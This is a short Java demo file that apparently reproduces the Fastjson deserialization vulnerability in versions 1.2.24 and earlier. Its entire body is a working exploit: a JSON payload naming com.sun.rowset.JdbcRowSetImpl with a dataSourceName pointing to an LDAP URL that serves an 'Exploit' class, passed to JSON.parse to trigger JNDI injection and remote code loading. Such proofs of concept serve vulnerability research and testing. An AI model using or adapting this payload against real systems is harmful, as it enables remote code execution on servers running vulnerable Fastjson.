package me.mole.fastjson.demo;

import com.alibaba.fastjson.JSON;

/**
 * 影响版本：<= 1.2.24
 */
public class Fastjson1224 {
    public static void main(String[] args){
        String payload =
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8384/Exploit\",\"autoCommit\":true}";
        Object jsonObject = JSON.parse(payload);
    }
}
